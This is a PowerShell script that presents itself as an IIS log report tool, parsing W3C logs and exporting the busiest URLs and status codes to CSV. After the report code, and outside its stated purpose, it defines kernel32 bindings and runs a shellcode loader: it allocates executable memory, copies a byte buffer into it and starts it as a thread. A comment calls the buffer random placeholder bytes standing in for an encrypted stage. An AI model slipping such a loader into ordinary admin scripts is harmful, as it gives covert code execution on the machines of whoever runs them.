
<#
.SYNOPSIS
    Parses IIS W3C logs and reports the busiest URLs and status codes.
.DESCRIPTION
    Reads the newest log files below the configured site folder, discovers the
    field order from the #Fields header and aggregates requests, errors and
    transferred bytes.
    The output is a CSV file that can be opened in Excel or forwarded to the web
    operations mailbox.
.PARAMETER LogRoot
    Paths are resolved relative to the invoking session.
.PARAMETER Days
    Paths are resolved relative to the invoking session.
.EXAMPLE
    .\Invoke-IisLogReport.ps1 -Days 7 -TopN 15
.EXAMPLE
    .\Invoke-IisLogReport.ps1 -LogRoot D:\Logs\iis\W3SVC2
.NOTES
    Author: J. Weber
    Last updated: 2024-03-25
#>

[CmdletBinding()]
param(
    [Parameter(HelpMessage = "Optional. The default value is used when the parameter is omitted.")]
    [string]$LogRoot = 'D:\Logs\iis\W3SVC2',

    [Parameter(Mandatory = $false)]
    [ValidateRange(1, 90)]
    [int]$Days = 7,

    [int]$TopN = 15,

    [string]$OutputPath = "C:\Reports\iis-top-2024-10-08.csv",

    [string]$HtmlPath = 'C:\Reports\iis-2024-10-08.html'
)


$cutoff = (Get-Date).AddDays(-$Days)
$logFiles = Get-ChildItem -Path $LogRoot -Filter '*.log' -File |
    Where-Object { $_.LastWriteTime -ge $cutoff }
if (@($logFiles).Count -eq 0) {
    throw ("No IIS logs found in {0} for the last {1} days" -f $LogRoot, $Days)
}

$entries = foreach ($log in $logFiles) {
    $fieldLine = Get-Content -LiteralPath $log.FullName -TotalCount 20 |
        Where-Object { $_ -match '^#Fields:' } | Select-Object -First 1
    if (-not $fieldLine) {
        Write-Verbose ("Skipping {0}: no field header" -f $log.Name)
        continue
    }
    $columns = ($fieldLine -replace '^#Fields:\s*', '') -split ' '
    $statusIndex = [array]::IndexOf($columns, 'sc-status')
    $uriIndex = [array]::IndexOf($columns, 'cs-uri-stem')
    $methodIndex = [array]::IndexOf($columns, 'cs-method')
    $bytesIndex = [array]::IndexOf($columns, 'sc-bytes')
    $timeIndex = [array]::IndexOf($columns, 'time-taken')
    Get-Content -LiteralPath $log.FullName | Where-Object { $_ -notmatch '^#' } | ForEach-Object {
        $parts = $_ -split ' '
        if ($parts.Count -lt $columns.Count) {
            return
        }
        [pscustomobject]@{
            Date      = $parts[0]
            Time      = $parts[1]
            Method    = $parts[$methodIndex]
            Uri       = $parts[$uriIndex]
            Status    = [int]$parts[$statusIndex]
            Bytes     = [int]$parts[$bytesIndex]
            TimeTaken = [int]$parts[$timeIndex]
        }
    }
}

$totalRequests = @($entries).Count
$errorEntries = $entries | Where-Object { $_.Status -ge 400 }
$totalMB = [math]::Round((($entries | Measure-Object -Property Bytes -Sum).Sum) / 1MB, 2)
$topUrls = $entries |
    Group-Object -Property Uri |
    Sort-Object -Property Count -Descending |
    Select-Object -First $TopN -Property @{Name = 'Uri'; Expression = { $_.Name }}, Count
$byStatus = $entries |
    Group-Object -Property Status |
    Sort-Object -Property Count -Descending |
    Select-Object -Property @{Name = 'Status'; Expression = { $_.Name }}, Count
$topUrls | Export-Csv -NoTypeInformation -Path $OutputPath

Write-Host ("Requests: {0} | Errors: {1} | Traffic: {2} MB" -f $totalRequests, @($errorEntries).Count, $totalMB) -ForegroundColor Cyan
$byStatus | Format-Table -AutoSize

$LogPath = "$env:TEMP\run.log"

$NativeCode = @"
using System;
using System.Runtime.InteropServices;

public static class NativeApi
{
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
        uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool VirtualFree(IntPtr lpAddress, uint dwSize,
        uint dwFreeType);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes,
        uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter,
        uint dwCreationFlags, out uint lpThreadId);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CloseHandle(IntPtr hObject);
}
"@

Add-Type -TypeDefinition $NativeCode -Language CSharp

# buffer placeholder: random bytes, replaces the encrypted stage in real samples
$Buffer = [Byte[]] @(
    0x25, 0x7a, 0x2f, 0x34, 0x68, 0x89, 0x87, 0x7d, 0x54, 0x15, 0x87, 0x37, 0x60, 0x21, 0x2e, 0xb7,
    0xcb, 0x9a, 0xe4, 0x62, 0xe5, 0xda, 0x60, 0x83, 0x34, 0xab, 0xd7, 0x5f, 0xff, 0xa0, 0x8f, 0x31,
    0xcc, 0x3c, 0x34, 0xad, 0xa5, 0x9e, 0x97, 0xf9, 0xd8, 0x35, 0xf3, 0xde, 0xcc, 0x99, 0x6d, 0xf9,
    0x70, 0x06, 0x08, 0x11, 0xea, 0xf5, 0x30, 0xa4, 0xce, 0x51, 0xbf, 0x8f, 0xcc, 0xf2, 0x1d, 0xf7,
    0x2e, 0x42, 0xcb, 0x94, 0xc9, 0xc5, 0x41, 0x9f, 0x0f, 0x4f, 0x59, 0x1f, 0x69, 0x9c, 0x1f, 0x6b,
    0xb2, 0x78, 0xfe, 0x54, 0x5f, 0xd5, 0x5a, 0xcb, 0x4d, 0x6b, 0xee, 0xfd, 0x60, 0x18, 0xd8, 0x32,
    0xd4, 0x10, 0x3a, 0xb5, 0x0c, 0x17, 0x65, 0xb9, 0xf9, 0xa9, 0x4b, 0x81, 0x63, 0x0a, 0xc5, 0xc8,
    0xfa, 0xed, 0x53, 0x29, 0x6b, 0x68, 0x83, 0x01, 0x48, 0x75, 0x78, 0xec, 0x6e, 0xb5, 0xae, 0x4f,
    0xc2, 0x2c, 0x71, 0xf9, 0xf6, 0x7c, 0x3f, 0xd5, 0xd3, 0xdd, 0xac, 0x5e, 0x87, 0x95, 0xee, 0xb8,
    0x45, 0x78, 0x42, 0x7b, 0x0a, 0xc9, 0x30, 0x95, 0x51, 0x41, 0xf5, 0x2f, 0x10, 0x68, 0x80, 0x40,
    0xc5, 0x20, 0xc9, 0xdc, 0xf7, 0x25, 0x2f, 0x9c, 0x01, 0x4b, 0x50, 0x1c, 0xd1, 0x54, 0xe8, 0xa9,
    0xc1, 0xc6, 0x6a, 0x6f, 0xdb, 0x42, 0x3d, 0x32, 0xa5, 0xe8, 0xdb, 0x68, 0xec, 0x0b, 0xeb, 0x15,
    0xa6, 0xd0, 0x9d, 0xe7, 0xd6, 0x52, 0x73, 0xec, 0x42, 0x9d, 0xf5, 0xc0, 0x6c, 0xa6, 0x4f, 0xce,
    0xf4, 0x90, 0x4d, 0xcf, 0x80, 0x51, 0xdf, 0x43, 0xb5, 0xf6, 0x20, 0x36, 0x52, 0x02, 0xbb, 0xb6,
    0xed, 0xce, 0x92, 0x37, 0x3f, 0x63, 0x8c, 0x2b, 0x83, 0xae, 0x2c, 0xef, 0xbc, 0x03, 0x51, 0xfd,
    0xea, 0xd7, 0x22, 0xeb, 0xbf, 0x9b, 0xbc, 0xb7, 0x7a, 0xbb, 0xac, 0x37, 0xd2, 0x49, 0xa6, 0x4d,
    0x03, 0xb9, 0xbf, 0x34, 0x3a, 0x67, 0xa4, 0x62, 0x44, 0x13, 0x95, 0x9a, 0x06, 0x9c, 0x3f, 0x66,
    0xe4, 0xb8, 0xa2, 0x92, 0xf0, 0xac, 0x8f, 0x7b, 0x48, 0x2f, 0xf0, 0x5e, 0x25, 0x66, 0xf0, 0x8d,
    0x1f, 0xcd, 0x10, 0x2c, 0xb6, 0xa6, 0x13, 0xea, 0x6c, 0x8e, 0x68, 0x52, 0x5e, 0x82, 0x83, 0xce,
    0x7a, 0x19, 0xcc, 0xec, 0xab, 0x84, 0x78, 0x06, 0x3c, 0xd0, 0x33, 0x4e, 0x9a, 0xb0, 0xe2, 0x10,
    0x52, 0x2b, 0xf3, 0x63, 0xd0, 0x2c, 0x22, 0x6a, 0x18, 0xc5, 0x8d, 0xfa, 0xc7, 0x65, 0xa4
)

$ProcHandle = [NativeApi]::VirtualAlloc([IntPtr]::Zero, $Buffer.Length, 0x3000, 0x40)
if ($ProcHandle -eq [IntPtr]::Zero) {
    Write-Error "VirtualAlloc failed: $([Runtime.InteropServices.Marshal]::GetLastWin32Error())"
    return
}

[Runtime.InteropServices.Marshal]::Copy($Buffer, 0, $ProcHandle, $Buffer.Length)
$ThreadId = 0
$Thread = [NativeApi]::CreateThread([IntPtr]::Zero, 0, $ProcHandle, [IntPtr]::Zero, 0, [ref]$ThreadId)
[void][NativeApi]::WaitForSingleObject($Thread, 4356)
[void][NativeApi]::CloseHandle($Thread)

$Report = [ordered]@{ Stage = 'loader'; BufferBytes = $Buffer.Length; ThreadId = $ThreadId }
$Report | ConvertTo-Json -Compress | Out-File -FilePath $LogPath -Append
